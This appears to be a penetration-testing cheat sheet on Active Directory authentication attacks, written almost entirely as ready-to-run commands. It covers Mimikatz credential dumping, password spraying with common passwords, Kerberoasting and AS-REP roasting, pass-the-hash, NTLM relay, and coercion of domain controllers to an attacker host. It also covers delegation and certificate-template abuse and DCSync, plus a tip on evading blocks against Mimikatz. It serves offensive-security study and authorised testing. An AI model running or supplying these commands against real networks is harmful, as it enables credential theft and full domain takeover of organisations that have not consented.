---
sidebar_position: 1
title: Authentication Attacks
---

# AD Authentication Attacks

```bash
# Set environment variables
export TARGET=<ip>
export DOMAIN=<domain>
export USER=<username>
export PASSWORD=<password>
export HASH=<ntlm-hash>
export LHOST=<your-ip>
```

---

## Cached Credentials (Mimikatz)

LSASS caches NTLM hashes and Kerberos tickets for logged-in users. Requires SYSTEM or Administrator privileges with `SeDebugPrivilege`.

Extract password hashes of all logged-in users:

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Extract Kerberos tickets from memory:

```powershell
sekurlsa::tickets
```

Elevate to SYSTEM token:

```powershell
token::elevate
```

Dump SAM database:

```powershell
lsadump::sam
```

:::tip
If Mimikatz is blocked, try renaming the executable, using an encoded/bypass script, or running it through an interactive logon (RDP) rather than WinRM. Alternative tools: nanodump, pypykatz, SharpKatz.
:::

---

## Password Spraying

:::warning
Check the domain password policy first to avoid lockouts. Pay attention to the lockout threshold AND the lockout observation window.
:::

Check password policy as a logged-in domain user:

```powershell
net accounts /domain
```

From Kali:

```bash
nxc smb $TARGET -u $USER -p $PASSWORD --pass-pol
```

### SprayPasswords.ps1 (From Windows)

```powershell
.\SprayPasswords.ps1 -Pass $PASSWORD -Admin
```

### NetExec (From Kali)

SMB spraying:

```bash
nxc smb $TARGET -u usernames.txt -p $PASSWORD --continue-on-success
```

:::tip
NetExec will also display if a successful user has admin privileges on the target.
:::

### Kerbrute (From Kali)

```bash
kerbrute passwordspray -d $DOMAIN --dc $TARGET usernames.txt $PASSWORD
```

### Common Passwords to Try

Spray these common patterns: `Season+Year` (e.g., `Spring2025`), `CompanyName+123`, `Welcome1`, `Password1`, `Changeme1`, the user's own username.

---

## AS-REP Roasting

If a user account has "Do not require Kerberos preauthentication" enabled, you can request an AS-REP and crack it offline. This setting is disabled by default but sometimes enabled manually.

### From Kali (impacket)

With credentials (enumerate vulnerable users):

```bash
impacket-GetNPUsers $DOMAIN/$USER:$PASSWORD -request -format hashcat -outputfile hashes_asrep.txt
```

Without credentials (requires a user list):

```bash
impacket-GetNPUsers $DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashes_asrep.txt -no-pass
```

### NetExec

```bash
nxc ldap $TARGET -u $USER -p $PASSWORD --asreproast --output hashes_asrep.txt
```

### From Windows (Rubeus)

```powershell
.\Rubeus.exe asreproast /nowrap
```

As a pre-authenticated domain user, Rubeus doesn't require specifying credentials.

### Cracking

```bash
hashcat -m 18200 hashes_asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Kerberoasting

When you have valid domain user credentials, you can request service tickets for accounts with SPNs and crack them offline. Any domain user can request service tickets for any SPN.

### impacket-GetUserSPNs (From Kali)

```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASSWORD -request -outputfile kerberoast_hashes.txt
```

### NetExec

```bash
nxc ldap $TARGET -u $USER -p $PASSWORD --kerberoast --output kerberoast_hashes.txt
```

### Rubeus (From Windows)

```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
```

### Targeted Kerberoasting

If you have GenericWrite or GenericAll over a user, you can set an SPN on their account, Kerberoast them, then remove the SPN:

```powershell
# Set SPN on target user
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='nonexistent/SERVICE'}

# Kerberoast them
.\Rubeus.exe kerberoast /user:TargetUser /outfile:targeted_hash.txt

# Clean up
Set-DomainObject -Identity TargetUser -Clear serviceprincipalname
```

### Cracking

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

:::tip
Focus on user accounts with SPNs, not machine accounts. Machine account passwords are complex and 120+ characters long — they can't be cracked. User-set passwords on service accounts are typically much weaker.
:::

---

## Pass-the-Hash (PtH)

Works when you have an NTLM hash. NTLM authentication uses the hash directly — it never needs the plaintext.

SMB enumeration with hash:

```bash
nxc smb $TARGET -u Administrator -H $HASH --shares
```

WinRM shell with hash:

```bash
nxc winrm $TARGET -u Administrator -H $HASH --exec whoami
```

Impacket PsExec with hash:

```bash
impacket-psexec -hashes 00000000000000000000000000000000:$HASH $USER@$TARGET
```

Evil-WinRM with hash:

```bash
evil-winrm -i $TARGET -u $USER -H $HASH
```

:::tip
Add `--local-auth` to NetExec if the hash is only valid for local accounts, not domain accounts.
:::

---

## NTLM Relay

Instead of cracking captured NTLM hashes, relay them directly to another service for immediate access.

### Setup

Disable SMB and HTTP in Responder (edit `/usr/share/responder/Responder.conf`, set `SMB = Off` and `HTTP = Off`).

Start Responder to capture authentication:

```bash
sudo responder -I eth0 -dwPv
```

Start ntlmrelayx to relay captured authentication:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

The `targets.txt` file contains IPs of machines where SMB signing is NOT required.

### Find Targets Without SMB Signing

```bash
nxc smb $SUBNET --gen-relay-list targets.txt
```

### Relay for SAM Dump

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Successful relay dumps the SAM database of the target.

### Relay for Shell

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

The `-i` flag starts an interactive SMB shell upon successful relay.

### Relay for Command Execution

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

:::warning
NTLM relay requires that the relayed authentication has admin rights on the target machine. The authentication is being relayed from user A to machine B — user A must be a local admin on machine B for the relay to result in useful access.
:::

---

## Coercion Attacks

Coercion attacks force a machine (typically a DC) to authenticate to your controlled machine, where you can relay the authentication.

### PetitPotam

Force a DC to authenticate using the EFS RPC interface:

```bash
python3 PetitPotam.py $LHOST $TARGET
```

Or the unauthenticated version:

```bash
python3 PetitPotam.py -u '' -p '' $LHOST $TARGET
```

Combine with ntlmrelayx to relay the DC's authentication:

```bash
impacket-ntlmrelayx -t https://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

This requests a certificate for the DC, which can be used to authenticate as the DC and DCSync the domain.

### PrinterBug (SpoolSample)

Abuse the Print Spooler service to force a machine to authenticate back to you:

```bash
python3 printerbug.py $DOMAIN/$USER:$PASSWORD@$TARGET $LHOST
```

### Coercer

Multi-protocol coercion tool that tests multiple RPC interfaces:

```bash
python3 Coercer.py -u $USER -p $PASSWORD -d $DOMAIN -l $LHOST -t $TARGET
```

:::tip
Coercion attacks are most powerful when combined with NTLM relay to ADCS (for certificate-based domain takeover) or when relaying to machines where the coerced account has admin rights.
:::

---

## Delegation Attacks

### Unconstrained Delegation

Machines with unconstrained delegation store the TGT of any user who authenticates to them. If you compromise such a machine, you can extract cached TGTs.

Find machines with unconstrained delegation:

```powershell
Get-NetComputer -Unconstrained | select dnshostname
```

From Kali:

```bash
impacket-findDelegation $DOMAIN/$USER:$PASSWORD -target-domain $DOMAIN
```

Extract cached TGTs with Mimikatz on the compromised machine:

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

Combine with coercion: use PrinterBug or PetitPotam to force a DC to authenticate to the unconstrained delegation machine, then capture the DC's TGT.

### Constrained Delegation

Machines/users with constrained delegation can impersonate any user to specific services listed in their `msDS-AllowedToDelegateTo` attribute.

Find constrained delegation:

```powershell
Get-NetUser -TrustedToAuth | select cn,msds-allowedtodelegateto
Get-NetComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto
```

Exploit with impacket-getST:

```bash
impacket-getST -spn CIFS/$TARGET -impersonate Administrator $DOMAIN/$USER:$PASSWORD
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
```

### Resource-Based Constrained Delegation (RBCD)

If you can write to a computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, you can configure it to trust a machine account you control.

Requirements: write access to the target computer's AD object, ability to create or control a machine account.

```bash
# Create a machine account
impacket-addcomputer $DOMAIN/$USER:$PASSWORD -computer-name 'YOURPC$' -computer-pass 'Password123!'

# Set RBCD — allow YOURPC$ to impersonate users to the target
impacket-rbcd $DOMAIN/$USER:$PASSWORD -delegate-from 'YOURPC$' -delegate-to '<target-computer>$' -action write

# Request a ticket impersonating Administrator
impacket-getST -spn CIFS/<target-computer> -impersonate Administrator $DOMAIN/'YOURPC$':'Password123!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@<target-computer> -k -no-pass
```

---

## ADCS (Active Directory Certificate Services) Attacks

If ADCS is deployed, certificate templates may have misconfigurations that allow privilege escalation.

### Enumerate Vulnerable Templates

From Kali:

```bash
certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $TARGET -vulnerable
```

From Windows:

```powershell
.\Certify.exe find /vulnerable
```

### ESC1 — Enrollee Supplies Subject

If a template allows the enrollee to specify the Subject Alternative Name (SAN), any user can request a certificate for any other user (e.g., Administrator):

```bash
certipy req -u $USER@$DOMAIN -p $PASSWORD -ca '<ca-name>' -template '<template-name>' -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $TARGET
```

### ESC4 — Template ACL Misconfiguration

If you have write access to a certificate template, modify it to become vulnerable to ESC1:

```bash
certipy template -u $USER@$DOMAIN -p $PASSWORD -template '<template-name>' -save-old
# Template is now vulnerable to ESC1
certipy req -u $USER@$DOMAIN -p $PASSWORD -ca '<ca-name>' -template '<template-name>' -upn administrator@$DOMAIN
# Restore original template
certipy template -u $USER@$DOMAIN -p $PASSWORD -template '<template-name>' -configuration old-template.json
```

### ESC8 — NTLM Relay to ADCS HTTP Enrollment

If the ADCS web enrollment endpoint allows NTLM authentication, relay captured authentication to request a certificate:

```bash
impacket-ntlmrelayx -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template <template-name>
```

Combine with PetitPotam to coerce a DC, relay to ADCS, get a DC certificate, and DCSync.

:::tip
ADCS attacks are among the most powerful AD attack vectors. A single misconfigured template can lead to full domain compromise. Always run `certipy find -vulnerable` during enumeration.
:::

---

## Shadow Credentials

If you have write access to a computer's `msDS-KeyCredentialLink` attribute, you can add a certificate credential and authenticate as that machine using PKINIT.

### Certipy (From Kali)

```bash
certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD -account '<target-computer>$'
```

This adds a key credential, authenticates with it, and retrieves the NT hash.

### Whisker (From Windows)

```powershell
.\Whisker.exe add /target:<target-computer>$ /domain:$DOMAIN /dc:$TARGET
```

Use the output certificate with Rubeus to request a TGT:

```powershell
.\Rubeus.exe asktgt /user:<target-computer>$ /certificate:<base64-cert> /password:<cert-password> /domain:$DOMAIN /dc:$TARGET /ptt
```

---

## DC Sync

Requires Domain Admin, Enterprise Admin, or accounts with Replicating Directory Changes rights.

### Mimikatz (From Windows)

```powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:$DOMAIN\Administrator
lsadump::dcsync /user:$DOMAIN\krbtgt
```

### impacket-secretsdump (From Kali)

Dump all domain hashes:

```bash
impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$TARGET
impacket-secretsdump $DOMAIN/$USER@$TARGET -hashes 00000000000000000000000000000000:$HASH
```

Dump a specific user:

```bash
impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$TARGET -just-dc-user Administrator
```
